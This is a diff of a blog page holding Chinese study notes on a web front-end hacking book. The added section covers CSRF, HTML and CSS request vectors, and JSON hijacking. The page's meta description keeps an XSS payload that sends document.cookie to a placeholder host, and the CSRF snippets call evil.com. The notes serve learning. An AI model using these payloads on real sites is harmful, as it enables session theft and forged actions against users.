@@ -90,7 +90,7 @@
 <meta property="og:site_name" content="CH4SER || 自闭室">
 <meta property="og:description" content="第二章 前端基础同域的概念 同协议(http https) 同域名 同端口  12&amp;lt;script&amp;gt; eval(location.hash.substr(1));&amp;lt;/script&amp;gt; 获取锚点后面的东西并执行http://xxx/xxx#new%20Image.src=&amp;quot;http://xxxxx/com?c=&amp;quot;+escape(document.cookie)">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-12-16T02:45:51.051Z">
+<meta property="og:updated_time" content="2019-12-16T03:28:51.707Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="web前端黑客技术揭秘-读书笔记[working]">
 <meta name="twitter:description" content="第二章 前端基础同域的概念 同协议(http https) 同域名 同端口  12&amp;lt;script&amp;gt; eval(location.hash.substr(1));&amp;lt;/script&amp;gt; 获取锚点后面的东西并执行http://xxx/xxx#new%20Image.src=&amp;quot;http://xxxxx/com?c=&amp;quot;+escape(document.cookie)">
@@ -333,7 +333,7 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-16T10:45:51+08:00">
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-16T11:28:51+08:00">
                 2019-12-16
               </time>
             
@@ -361,7 +361,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1.8k
+                  2.2k
                 </span>
               
 
@@ -377,7 +377,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  8
+                  9
                 </span>
               
             </div>
@@ -476,6 +476,25 @@
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(xxx)</span><br><span class="line">window.execScript(xxx)</span><br><span class="line">window.setInterval(xxx)</span><br><span class="line">window.setTimeout(xxx)</span><br></pre></td></tr></table></figure>
 
+<h2 id="第四章-前端黑客之CSRF"><a href="#第四章-前端黑客之CSRF" class="headerlink" title="第四章 前端黑客之CSRF"></a>第四章 前端黑客之CSRF</h2><p>比如</p>
+<p>攻击者构造<a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a> 并诱发受害人打开页面, 打开的时候代码触发, 向<a href="http://www.a.com发送了转账的get请求" target="_blank" rel="noopener">www.a.com发送了转账的get请求</a>, 而在打开b之前要求已经完成了银行的身份验证, 这就是CSRF.</p>
+<blockquote>
+<p>同源策略可以限制客户端脚本的跨域请求行为, 但是实际上, 由客户端HTML标签发出的跨域GET请求和POST请求是合法的, 不在同源策略的限制中</p>
+</blockquote>
+<p>可以没有js参与</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.evil.com</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">new</span> Image().src= <span class="string">'http://evil.com'</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里脚本只是生成img对象, 并没有参与跨站, 不会被同源策略阻挠.</p>
+<p>注意:</p>
+<p>IE的策略里面, 两种cookie中, 本地cookie是不允许在跨域请求中被带上, 除非设置P3P, 其他浏览器没这种限制</p>
+<h3 id="HTML可以发起GET请求的标签"><a href="#HTML可以发起GET请求的标签" class="headerlink" title="HTML可以发起GET请求的标签"></a>HTML可以发起GET请求的标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&apos;&apos;&gt;</span><br><span class="line">&lt;img src=&apos;&apos;&gt;</span><br><span class="line">&lt;img lowsrc=&apos;&apos;&gt;</span><br><span class="line">&lt;img dynsrc=&apos;&apos;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;&quot;&gt;</span><br><span class="line">&lt;frame src=&quot;&quot;&gt;</span><br><span class="line">&lt;script src=&quot;&quot;&gt;</span><br><span class="line">&lt;bgsound src=&quot;&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;&quot;&gt;</span><br><span class="line">&lt;video src=&quot;&quot;&gt;</span><br><span class="line">&lt;audio src=&quot;&quot;&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;</span><br><span class="line">&lt;table background=&quot;&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSS中的发GET请求"><a href="#CSS中的发GET请求" class="headerlink" title="CSS中的发GET请求"></a>CSS中的发GET请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;&quot;</span><br><span class="line">background:url(&quot;&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="JSON-HiJacking"><a href="#JSON-HiJacking" class="headerlink" title="JSON HiJacking"></a>JSON HiJacking</h3><p>自定义回调函数, 将AJAX中响应数据中的JSOn作为参数并处理(用参数中的cookie来发送请求之类的)</p>
 
       
     </div>
@@ -735,7 +754,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第二章-前端基础"><span class="nav-number">1.</span> <span class="nav-text">第二章 前端基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#同域的概念"><span class="nav-number">1.1.</span> <span class="nav-text">同域的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">1.2.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP"><span class="nav-number">1.3.</span> <span class="nav-text">HTTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iframe"><span class="nav-number">1.4.</span> <span class="nav-text">iframe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取特定标签对象"><span class="nav-number">1.5.</span> <span class="nav-text">获取特定标签对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#请求头响应头和javascript"><span class="nav-number">1.6.</span> <span class="nav-text">请求头响应头和javascript</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HttpOnly-Cookie-读取"><span class="nav-number">1.7.</span> <span class="nav-text">HttpOnly Cookie 读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ajax"><span class="nav-number">1.8.</span> <span class="nav-text">Ajax</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#post"><span class="nav-number">1.9.</span> <span class="nav-text">post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#子域策略cookie"><span class="nav-number">1.10.</span> <span class="nav-text">子域策略cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#路径策略cookie"><span class="nav-number">1.11.</span> <span class="nav-text">路径策略cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-only-cookie-泄露的情况"><span class="nav-number">1.12.</span> <span class="nav-text">http-only cookie 泄露的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#localStorage-cookie"><span class="nav-number">1.13.</span> <span class="nav-text">localStorage cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用E4X来混淆javascript代码"><span class="nav-number">1.14.</span> <span class="nav-text">利用E4X来混淆javascript代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#javascript-函数劫持"><span class="nav-number">1.15.</span> <span class="nav-text">javascript 函数劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSS-容错性"><span class="nav-number">1.16.</span> <span class="nav-text">CSS 容错性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSS伪类"><span class="nav-number">1.17.</span> <span class="nav-text">CSS伪类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSS-属性选择"><span class="nav-number">1.18.</span> <span class="nav-text">CSS 属性选择</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三章-前端黑客之XSS"><span class="nav-number">2.</span> <span class="nav-text">第三章 前端黑客之XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-xss概念"><span class="nav-number">2.1.</span> <span class="nav-text">DOM xss概念</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第二章-前端基础"><span class="nav-number">1.</span> <span class="nav-text">第二章 前端基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#同域的概念"><span class="nav-number">1.1.</span> <span class="nav-text">同域的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">1.2.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP"><span class="nav-number">1.3.</span> <span class="nav-text">HTTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iframe"><span class="nav-number">1.4.</span> <span class="nav-text">iframe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取特定标签对象"><span class="nav-number">1.5.</span> <span class="nav-text">获取特定标签对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#请求头响应头和javascript"><span class="nav-number">1.6.</span> <span class="nav-text">请求头响应头和javascript</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HttpOnly-Cookie-读取"><span class="nav-number">1.7.</span> <span class="nav-text">HttpOnly Cookie 读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ajax"><span class="nav-number">1.8.</span> <span class="nav-text">Ajax</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#post"><span class="nav-number">1.9.</span> <span class="nav-text">post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#子域策略cookie"><span class="nav-number">1.10.</span> <span class="nav-text">子域策略cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#路径策略cookie"><span class="nav-number">1.11.</span> <span class="nav-text">路径策略cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-only-cookie-泄露的情况"><span class="nav-number">1.12.</span> <span class="nav-text">http-only cookie 泄露的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#localStorage-cookie"><span class="nav-number">1.13.</span> <span class="nav-text">localStorage cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用E4X来混淆javascript代码"><span class="nav-number">1.14.</span> <span class="nav-text">利用E4X来混淆javascript代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#javascript-函数劫持"><span class="nav-number">1.15.</span> <span class="nav-text">javascript 函数劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSS-容错性"><span class="nav-number">1.16.</span> <span class="nav-text">CSS 容错性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSS伪类"><span class="nav-number">1.17.</span> <span class="nav-text">CSS伪类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSS-属性选择"><span class="nav-number">1.18.</span> <span class="nav-text">CSS 属性选择</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三章-前端黑客之XSS"><span class="nav-number">2.</span> <span class="nav-text">第三章 前端黑客之XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-xss概念"><span class="nav-number">2.1.</span> <span class="nav-text">DOM xss概念</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第四章-前端黑客之CSRF"><span class="nav-number">3.</span> <span class="nav-text">第四章 前端黑客之CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML可以发起GET请求的标签"><span class="nav-number">3.1.</span> <span class="nav-text">HTML可以发起GET请求的标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSS中的发GET请求"><span class="nav-number">3.2.</span> <span class="nav-text">CSS中的发GET请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSON-HiJacking"><span class="nav-number">3.3.</span> <span class="nav-text">JSON HiJacking</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -769,7 +788,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">59.1k</span>
+    <span title="Site words total count">59.7k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
